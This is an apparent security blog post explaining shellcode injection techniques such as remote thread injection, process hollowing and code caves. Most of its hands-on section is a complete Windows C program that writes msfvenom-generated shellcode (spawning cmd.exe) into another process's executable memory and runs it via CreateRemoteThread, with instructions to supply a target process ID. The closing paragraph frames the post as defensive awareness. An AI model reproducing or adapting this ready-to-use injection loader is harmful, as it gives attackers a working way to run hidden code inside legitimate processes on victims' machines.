---
title: Shellcode Injection
date: 2024-03-02
categories:
  - malware
  - execution
tags:
  - english
toc: "true"
---
Shellcode is a snippet of machine code typically written in assembly language. It's designed to perform a specific task when executed, often granting the attacker control over the compromised system. 

Shellcode injection involves the insertion and execution of such malicious code within the memory space of a target process, bypassing traditional security measures.

# Techniques for Shellcode Injection

## 1. Process Injection:

   - **Remote Thread Injection**: This technique involves creating a remote thread in the target process and directing it to execute the shellcode.
   - **Process Hollowing**: In process hollowing, a legitimate process is spawned in a suspended state, its memory contents replaced with the attacker's shellcode, and then resumed to execute the malicious code.

## 2. Code Cave Injection:

   - **Code Cave**: A code cave refers to an unused or padding section of executable memory within a process. Attackers exploit these code caves to inject and execute their shellcode, often evading detection.
   - **Return-Oriented Programming (ROP)**: ROP chains leverage existing code fragments within a process, known as gadgets, to perform malicious operations. Attackers construct a sequence of gadgets that ultimately lead to the execution of the injected shellcode.

In this blog post we will cover the **Remote Thread Injection**. 

# Hands-On: Shellcode Injection with C Code Snippet 
## Understanding Shellcode Injection Process

Before delving into the code snippet, let's understand the purpose of each function used in the shellcode injection process and its significance within the attack:

1. **Opening the Target Process**: Use [`OpenProcess`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) to open a handle to the target process identified by its process ID.
    
2. **Memory Allocation**: Use [`VirtualAllocEx`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) to allocate memory within the address space of the target process.
    
3. **Shellcode Injection**: Use [`WriteProcessMemory`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) to write the shellcode to the allocated memory within the target process.
    
4. **Remote Thread Creation**: Use [`CreateRemoteThread`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread) to create a remote thread in the target process, specifying the entry point as the allocated memory containing the shellcode.
    
5. **Cleanup**: Close handles and release allocated memory after the execution of the remote thread.


```C
#include <windows.h>
#include <stdio.h>

//msfvenom -a x86 --platform windows -p windows/exec CMD="cmd.exe" EXITFUNC=thread -f c
unsigned char shellcode[] = 
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x6d\x64\x2e\x65\x78\x65\x00";


int main()
{
    // Open the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, <TARGET_PROCESS_ID>); // Replace <TARGET_PROCESS_ID> with the process ID of the target process
    if (hProcess == NULL) {
        printf("Failed to open target process. Error code: %d\n", GetLastError());
        return 1;
    }

    // Allocate memory within the target process
    LPVOID pAllocatedMemory = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pAllocatedMemory == NULL) {
        printf("Failed to allocate memory in target process. Error code: %d\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    // Write the shellcode to the allocated memory in the target process
    if (!WriteProcessMemory(hProcess, pAllocatedMemory, shellcode, sizeof(shellcode), NULL)) {
        printf("Failed to write shellcode to target process. Error code: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pAllocatedMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Create a remote thread in the target process to execute the shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pAllocatedMemory, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread. Error code: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pAllocatedMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Wait for the remote thread to terminate
    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pAllocatedMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return 0;
}

```


Remember to collect the desired PID of the process you want to inject the shellcode to and change it for the `<TARGET_PROCESS_ID>` variable in the OpenProcess() function call. 
# Conclusion

Shellcode injection represents a formidable challenge in the realm of cybersecurity, enabling attackers to covertly execute malicious code within legitimate processes. Understanding the intricacies of shellcode injection, along with implementing robust detection and mitigation strategies, is essential for organizations to defend against this stealthy threat. By staying vigilant and adopting a multi-layered security approach, organizations can bolster their defenses and mitigate the risks posed by shellcode injection in today's dynamic threat landscape. Explore more insights into cybersecurity challenges and solutions in our ongoing series.